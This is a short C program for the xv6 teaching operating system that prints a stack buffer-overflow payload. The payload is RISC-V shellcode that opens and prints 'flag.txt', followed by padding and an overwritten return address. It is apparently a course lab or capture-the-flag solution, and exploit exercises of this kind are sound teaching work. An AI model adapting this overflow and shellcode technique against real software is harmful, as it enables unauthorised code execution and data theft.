#include "kernel/types.h"
#include "user/user.h"

char shellcode[] = {
0x17,0x05,0x00,0x00,0x13,0x05,0x85,0x03,0x93,0x05,0x00,0x00,0x93,0x08,0xf0,0x00,
0x73,0x00,0x00,0x00,0x93,0x05,0x01,0x00,0x13,0x06,0x00,0x08,0x93,0x08,0x50,0x00,
0x73,0x00,0x00,0x00,0x13,0x05,0x10,0x00,0x93,0x05,0x01,0x00,0x13,0x06,0x00,0x08,
0x93,0x08,0x00,0x01,0x73,0x00,0x00,0x00,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,
0x00,0x00,0x01,0x00
};


int main() {

   // fills buf[128]
   write(1, shellcode, sizeof(shellcode));

   for(int i=0; i<128-sizeof(shellcode); i++){
      write(1, "A", 1);
   }
   // fills saved fp
   for(int i=0; i<8; i++){
      write(1, "A", 1);
   }


   long long win_ptr = 0x3f30; // 64 bit integer with 0x40 as value
   // fills saved ra
   write(1, &win_ptr, 8);

   write(1, "\n", 1);


  exit(0);
}
